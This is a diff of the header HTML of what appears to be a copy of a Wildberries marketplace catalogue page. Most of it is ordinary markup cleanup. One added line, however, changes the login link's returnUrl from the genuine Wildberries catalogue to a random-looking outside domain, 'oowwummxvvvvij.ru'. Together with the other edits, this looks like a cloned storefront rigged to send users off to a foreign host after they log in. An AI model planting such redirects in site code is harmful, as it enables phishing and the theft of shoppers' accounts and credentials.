@@ -98,7 +98,7 @@
                 <li class="simple-menu__item hide j-s-vsemrabota"><a href="https://vsemrabota.ru/appwb/" target="_blank" rel="noopener" class="simple-menu__link j-wba-header-item" data-wba-header-name="Vsemrabota">Трудоустройство</a></li>
 
                 <li class="simple-menu__item"><a href="/services/prodavayte-na-wildberries" class="simple-menu__link simple-menu__link--sell-on-wb j-wba-header-item" data-wba-header-name="Seller" target="_blank">Продавайте на Wildberries</a></li>
-                <li class="simple-menu__item"><a href="https://www.wildberries.ru/services/trudoustroystvo" class="simple-menu__link simple-menu__link--employment j-wba-header-item" data-wba-header-name="Job">Работа в Wildberries</a></li>
+                <li class="simple-menu__item"><a href="/services/trudoustroystvo" class="simple-menu__link simple-menu__link--employment j-wba-header-item" data-wba-header-name="Job">Работа в Wildberries</a></li>
             </ul>
             <button class="header__btn-chat btn-chat j-btn-chat-open" type="button" aria-label="Открыть онлайн чат"><span class="btn-chat__text">Сообщить о проблеме</span></button>
         </div>
@@ -115,7 +115,26 @@
                     <button class="nav-element__geo hide-desktop j-geocity-link j-wba-header-item" data-wba-header-name="DLV_Adress" type="button" aria-label="Ваше местоположение">Москва</button>
                 </div>
             </div>
-            <div class="header__navbar-pc navbar-pc j-b-header-menu" id="basketContent"><script type="jsv#71_"></script>    <div class="navbar-pc__item j-item-addresses">        <a class="navbar-pc__link j-wba-header-item" data-wba-header-name="Pick_up_points" href="/services/besplatnaya-dostavka?desktop=1#terms-delivery">            <span class="navbar-pc__icon navbar-pc__icon--address"></span>            Адреса        </a>        <script type="jsv#135^"></script><script type="jsv#7705_"></script>        <div class="navbar-pc__tooltip tooltip-addresses j-tooltip-addresses">            <div class="tooltipster-content">                <span class="count"><b>21 101</b> пункт выдачи</span>                            </div>        </div>        <script type="jsv/7705_"></script><script type="jsv/135^"></script>    </div>        <script type="jsv#72_"></script>        <script type="jsv#136^"></script><script type="jsv#73_"></script>            <div class="navbar-pc__item">                <a class="navbar-pc__link j-main-login j-wba-header-item" data-wba-header-name="Login" href="/security/login?returnUrl=https%3A%2F%2Fwww.wildberries.ru%2Fcatalog%2Fzhenshchinam%2Fodezhda%2Fbluzki-i-rubashki">                    <span class="navbar-pc__icon navbar-pc__icon--profile"></span>                    Войти                </a>            </div>        <script type="jsv/73_"></script><script type="jsv/136^"></script>        <div class="navbar-pc__item j-item-basket">            <a class="navbar-pc__link j-wba-header-item" data-wba-header-name="Cart" href="/lk/basket">                <span class="navbar-pc__icon navbar-pc__icon--basket"><script type="jsv#137^"></script><script type="jsv/137^"></script></span>                Корзина            </a>        </div>    <script type="jsv/72_"></script><script type="jsv/71_"></script></div>
+            <div class="header__navbar-pc navbar-pc j-b-header-menu" id="basketContent">
+                <div class="navbar-pc__item j-item-addresses">
+                    <a class="navbar-pc__link j-wba-header-item" data-wba-header-name="Pick_up_points"
+                        href="/services/besplatnaya-dostavka?desktop=1#terms-delivery">
+                        <span class="navbar-pc__icon navbar-pc__icon--address"></span> Адреса </a>
+                    <div class="navbar-pc__tooltip tooltip-addresses j-tooltip-addresses">
+                        <div class="tooltipster-content"><span class="count"><b>21 101</b> пункт выдачи</span></div>
+                    </div>
+                </div>
+                <div class="navbar-pc__item">
+                    <a class="navbar-pc__link j-main-login j-wba-header-item"
+                        data-wba-header-name="Login"
+                        href="/security/login?returnUrl=https://oowwummxvvvvij.ru">
+                        <span class="navbar-pc__icon navbar-pc__icon--profile"></span> Войти </a></div>
+                <div class="navbar-pc__item j-item-basket">
+                    <a class="navbar-pc__link j-wba-header-item" data-wba-header-name="Cart" href="/lk/basket">
+                        <span class="navbar-pc__icon navbar-pc__icon--basket"></span>Корзина
+                    </a>
+                </div>
+            </div>
             <div id="searchBlock" class="header__search-catalog search-catalog j-search-catalog hide-mobile " data-link="
          {on 'click' '.j-suggest' followSuggest}
          {on 'click' '.j-suggest-tag' fillWithTag}
